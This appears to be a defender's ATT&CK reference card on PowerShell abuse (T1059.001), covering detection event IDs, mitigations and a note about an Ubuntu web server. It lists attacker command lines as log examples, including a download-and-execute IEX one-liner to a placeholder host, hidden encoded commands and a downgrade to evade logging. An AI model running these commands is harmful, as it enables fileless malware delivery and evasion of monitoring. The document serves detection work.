T1059.001 – Command and Scripting Interpreter: PowerShell

Tactic: Execution (TA0002)
Platforms: Windows
Permissions required: User
Description: Adversaries abuse the PowerShell interpreter to run commands, scripts, modules, and downloaded payloads. Because PowerShell is a signed, native Windows component (powershell.exe / pwsh.exe), it blends into normal admin traffic and is one of the most used execution vectors on Windows hosts.

Common invocation patterns seen in logs:
  powershell.exe -nop -w hidden -enc <base64>       (hidden, no profile, Base64-encoded command; -enc is shorthand for -EncodedCommand)
  powershell.exe -ExecutionPolicy Bypass -File x.ps1
  powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://<host>/a')"   (download-and-execute / fileless)
  powershell.exe -Version 2                                     (downgrade to evade ScriptBlock logging)
  Add-Type / Reflection.Assembly / InstallUtil-style in-memory .NET loading

Detection data sources:
  Process creation: Event ID 4688 / Sysmon 1 — parent-child anomalies, e.g. winword.exe, excel.exe, wscript.exe, mshta.exe, or a service binary spawning powershell.exe; rare command-line flags (-nop, -w hidden, -enc, -ep bypass, long encoded blobs).
  ScriptBlock logging: PowerShell 4104 — captures deobfuscated script body, useful for IEX, DownloadString, FromBase64String.
  Module logging 4103, engine start/stop 400/600.
  Transcription and AMSI provider hits.
  Network: Event ID 3 / proxy logs — powershell.exe initiating outbound HTTP to uncommon hosts.
  Registry: WMI persistence, PowerShell profile modification.

Relevant ATT&CK sub-technique notes:
  T1059.001 covers the interpreter itself; the payload stages are usually also tagged T1027 (Obfuscated Files or Information), T1055 (Process Injection), T1105 (Ingress Tool Transfer), T1071.001 (Web Protocols C2), T1569 / T1053 for the launching mechanism.

Mitigations: constrained language mode + AppLocker/WDAC, PowerShell v5+ with ScriptBlock and Module logging to a central collector via GPO, AMSI on all versions, disable or restrict PSv2 engine, least privilege and Credential Guard, application allow-listing of admin endpoints.

Mapped Linux-equivalent note for this host: T1059.004 (Unix Shell) is the matching interpreter abuse technique here; nothing on web-srv-01 currently logs PowerShell activity — this box is Ubuntu 22.04.3 and does not run it.
